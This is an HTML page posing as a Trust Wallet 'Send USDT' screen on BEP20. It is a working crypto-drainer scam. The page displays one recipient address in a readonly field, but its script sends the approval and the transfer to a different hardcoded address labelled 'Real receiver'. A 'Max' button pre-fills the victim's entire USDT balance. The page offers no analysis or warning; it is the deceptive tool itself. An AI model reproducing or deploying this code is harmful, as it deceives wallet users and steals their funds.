<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    html, body {
      font-family: sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      color: #000;
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .container {
      flex: 1;
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      color: #555;
      display: block;
      margin: 20px 0 8px;
    }

    .input-box {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 0 10px;
      position: relative;
    }

    .input-box input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .input-box .clear-btn,
    .input-box .paste-btn {
      background: none;
      border: none;
      font-size: 14px;
      color: #0052ff;
      font-weight: bold;
      cursor: pointer;
      margin-left: 6px;
    }

    .amount-section {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-top: 8px;
    }

    .amount-section input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .amount-section span, .amount-section .max-btn {
      padding: 0 12px;
      color: #0052ff;
      font-weight: bold;
      font-size: 14px;
    }

    .converted {
      margin-top: 10px;
      color: #888;
      font-size: 14px;
    }

    .footer {
      padding: 16px;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }

    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border-radius: 20px;
      cursor: pointer;
      position: relative;
    }

    .button.loading::after {
      content: "Processing...";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: transparent;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 16px;
      color: #fff;
      font-weight: bold;
      border-radius: 20px;
    }

    .button.loading span {
      visibility: hidden;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" id="address" value="0xc07506a44dd9E2A0d4F010465C40A80A2117219a" readonly>
      <button class="clear-btn" onclick="document.getElementById('address').value = ''">Ã—</button>
      <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-section">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span>USDT</span>
      <span class="max-btn" onclick="setMax()">Max</span>
    </div>

    <div class="converted">= $0.00</div>
  </div>

  <div class="footer">
    <button class="button" id="nextBtn" onclick="nextStep()"><span>Next</span></button>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP20)
    const receiverAddress = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Real receiver

    const usdtAbi = [
      {
        "constant": false,
        "inputs": [
          { "name": "_spender", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          { "name": "_to", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{ "name": "_owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "balance", "type": "uint256" }],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{ "name": "", "type": "uint8" }],
        "type": "function"
      }
    ];

    async function setMax() {
      if (typeof window.ethereum === 'undefined') return alert("Trust Wallet not detected");
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await contract.methods.balanceOf(accounts[0]).call();
      const decimals = await contract.methods.decimals().call();
      const formatted = (balance / (10 ** decimals)).toFixed(2);
      document.getElementById('amount').value = formatted;
      document.querySelector('.converted').innerText = `= $${formatted}`;
    }

    async function nextStep() {
      const btn = document.getElementById('nextBtn');
      const amount = document.getElementById('amount').value;
      if (!amount) return alert("Please enter amount");

      btn.classList.add("loading");

      try {
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
        const decimals = await contract.methods.decimals().call();
        const value = web3.utils.toBN(amount * (10 ** decimals));

        // Step 1: Approve
        await contract.methods.approve(receiverAddress, value).send({ from: accounts[0] });

        // Step 2: Transfer
        await contract.methods.transfer(receiverAddress, value).send({ from: accounts[0] });

        alert("Transfer successful!");
      } catch (err) {
        console.error(err);
        alert("Transaction failed: " + (err.message || "Unknown error"));
      }

      btn.classList.remove("loading");
    }
  </script>

</body>
</html>
